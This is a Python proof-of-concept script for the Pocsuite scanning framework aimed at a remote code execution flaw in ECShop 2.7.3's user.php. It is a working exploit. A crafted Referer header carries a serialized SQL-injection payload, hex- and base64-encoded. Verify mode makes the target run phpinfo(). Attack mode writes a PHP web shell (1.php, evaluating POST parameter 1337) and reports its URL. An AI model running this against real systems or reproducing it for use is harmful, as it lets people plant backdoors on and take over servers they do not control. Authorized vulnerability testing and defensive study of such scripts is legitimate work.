#!/usr/bin/python
# -*- coding:utf-8 -*-

import string
import random
import time
import re
from pocsuite.net import req
from pocsuite.poc import POCBase, Output
from pocsuite.utils import register

def get_url(url, referer):
    try:
        httpreq = req.Session()
        headers = {
        "User-Agent" : "Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:66.0) Gecko/20100101 Firefox/66.0",
        "Accept" : "text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8",
        "Accept-Language" : "zh-CN,zh;q=0.8,zh-TW;q=0.7,zh-HK;q=0.5,en-US;q=0.3,en;q=0.2",
        "Referer" : referer
        }
        resp = httpreq.get(url, headers=headers)
    except Exception as ex:
        resp = None
    return resp


class TestPOC(POCBase):
    name = 'ecshop2.7.3 Remote Code Execution Vulnerability'
    vulID = '0'
    author = ['cws6']
    vulType = 'code-exec'
    version = '1'
    references = ['https://paper.seebug.org/695/']
    desc = '''ecshop2x/3x user.php存在任意代码执行'''

    vulDate = '2018-08-31'
    createDate = '2019-04-08'
    updateDate = '2019-04-08'

    appName = 'ecshop'
    appVersion = '2.7.3'
    appPowerLink = 'http://www.shopex.cn'
    samples = ['re']

    def _attack(self):
        """attack mode"""
        result = {}
        payload1 = '/user.php?act=login'
        referer = '554fcae493e564ee0dc75bdf2ebf94caads|a:2:{s:3:"num";s:280:"*/ union select 1,0x272f2a,3,4,5,6,7,8,0x7b24617364275d3b617373657274286261736536345f6465636f646528275a6d6c735a56397764585266593239756447567564484d6f4a7a4575634768774a79776e50443977614841675a585a686243676b58314250553152624d544d7a4e3130704f79412f506963702729293b2f2f7d787878,10-- -";s:2:"id";s:3:"\'/*";}'
        resp = get_url(self.url + payload1,referer)
        time.sleep(2)
        if req.get(self.url + '/1.php').status_code == 200:
            result['ShellInfo'] = {}
            result['ShellInfo']['URL'] = self.url + '/1.php'
            result['ShellInfo']['content'] = '<?php eval($_POST[1337]); ?>'
        return self.parse_output(result)

    def _verify(self):
        """verify mode"""
        result = {}
        payload1 = '/user.php?act=login'
        referer = '554fcae493e564ee0dc75bdf2ebf94caads|a:2:{s:3:"num";s:110:"*/ union select 1,0x27202f2a,3,4,5,6,7,8,0x7b24616263275d3b6563686f20706870696e666f2f2a2a2f28293b2f2f7d,10-- -";s:2:"id";s:4:"\' /*";}554fcae493e564ee0dc75bdf2ebf94ca'
        resp = get_url(self.url + payload1,referer)
        time.sleep(2)
        if 'phpinfo' in resp.content:
            result['VerifyInfo'] = {}
            result['VerifyInfo']['URL'] = self.url
        return self.parse_output(result)

    def parse_output(self, result):
        output = Output(self)
        if result:
            output.success(result)
        else:
            output.fail('Internet nothing returned')
        return output


register(TestPOC)

